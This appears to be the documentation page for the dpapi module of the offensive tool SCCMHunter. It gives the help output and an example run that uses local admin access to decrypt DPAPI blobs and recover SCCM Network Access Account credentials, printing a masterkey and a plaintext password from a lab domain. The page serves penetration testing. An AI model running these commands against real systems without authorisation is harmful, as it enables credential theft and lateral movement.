## Using the dpapi module

### Description

Recover SCCM Network Access Account credentials from a remote target system. 

### Requirements

Valid credentials for a local administrator on the target system
### Usage
```
└─# python3 sccmhunter.py dpapi -h                                                                                   
SCCMHunter vdev0.0.3 by @garrfoster
                                                                                                                                                                                                      
 Usage: sccmhunter dpapi [OPTIONS] COMMAND [ARGS]...                                                                                                                                                  
                                                                                                                                                                                                      
 Extract NAA credentials from DPAPI encrypted blobs.                                                                                                                                                  
                                                                                                                                                                                                      
╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *          -u            TEXT           Username [default: None] required]                                                                                                                        │
│            -p            TEXT           Password                                                                                                                                                   │
│            -d            TEXT           Target domain                                                                                                                                              │
│            -dc-ip        TEXT           IP address or FQDN of domain controller [default: None]                                                                                                    │
│ *          -target       TEXT           Target hostname [default: None] [required]                                                                                                                 │
│            -k                           Use Kerberos authentication                                                                                                                                │
│            -no-pass                     don't ask for password (useful for -k)                                                                                                                     │
│            -hashes       LMHASH:NTHASH  LM and NT hashes, format is LMHASH:NTHASH [default: None]                                                                                                  │
│            -aes          HEX KEY        AES key to use for Kerberos Authentication (128 or 256 bits) [default: None]                                                                               │
│            -debug                       Enable Verbose Logging                                                                                                                                     │
│    --help  -h                           Show this message and exit.                                                                                                                                │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
                                                            
```


### Examples
```
└─# python3 sccmhunter.py dpapi -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -target 10.10.100.9
SCCMHunter vdev0.0.3 by @garrfoster
[12:14:01] INFO     [*] Querying SCCM configuration via WMI                                                                                                                                           
[12:14:07] INFO     [+] Got 2 SCCM secrets.                                                                                                                                                           
[12:14:07] INFO     [+] Credential file found: DFBE70A7E5CC19A398EBF1B96859CE5D                                                                                                                       
[12:14:07] INFO     [+] Retrieving credential file: DFBE70A7E5CC19A398EBF1B96859CE5D                                                                                                                  
[12:14:08] INFO     [+] Retrieving masterkey file: 020989BE-7C86-4C4E-BA03-81073AB67ADA                                                                                                               

[12:14:49] INFO     [+] DPAPI UserKey: 0x0bd7f132169c28f7c5241a9d7648f30110c5570a                                                                                                                     
[12:14:50] INFO     [+] Decrypted masterkey 020989BE-7C86-4C4E-BA03-81073AB67ADA:                                                                                                                     
                    0x68611aa5d0ae31dfef0212a2fef72ead45667c807c8ceaf5489ec5ba75cc6ed0304cd844f9c3040f9e3bbdc4f5a098f65d8368a68cc8124fbe40732f8768e95a                                                
[12:14:50] INFO     [+] Got NAA credential - Username: lab\administrator | Password: P@ssw0rd                                                                                                         
[12:14:50] INFO     [+] NAA credentials saved to /root/.sccmhunter/logs/csvs/naa_creds.csv    
```